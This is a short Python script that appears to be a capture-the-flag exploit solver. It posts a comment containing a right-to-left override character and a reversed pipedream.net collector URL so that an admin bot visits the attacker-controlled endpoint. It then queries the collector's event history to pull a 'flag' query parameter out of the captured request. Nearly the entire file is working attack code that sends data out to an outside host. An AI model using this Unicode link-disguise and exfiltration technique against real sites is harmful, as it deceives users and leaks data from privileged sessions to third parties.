import requests
import json
import urllib.parse
import os


def attack():
    ENDPOINT = os.environ["ENDPOINT"]

    text = f"‮https://eosa9ye91a918w0.m.pipedream.net/{ENDPOINT[::-1]}"
    res = requests.post(f"{ENDPOINT}", json={"text": text}).text
    message = json.loads(res)["message"]
    if message != "admin: Very good web site. Thanks for sharing!":
        raise ValueError(f"ERROR {message}")


def get_flag():
    pipedream_token = os.environ["ACCESS_TOKEN"]
    headers = {"Authorization": "Bearer {}".format(pipedream_token)}
    res = requests.get(
        "https://api.pipedream.com/v1/sources/dc_qQuadwq/event_summaries",
        headers=headers,
    ).text
    pipe_history = json.loads(res)
    try:
        url = pipe_history["data"][0]["event"]["url"]
        qs = urllib.parse.urlparse(url).query
        qs_d = urllib.parse.parse_qs(qs)
        print(qs_d["flag"][0])
    except Exception:
        print("ERROR: Could not get the flag.")


attack()
get_flag()
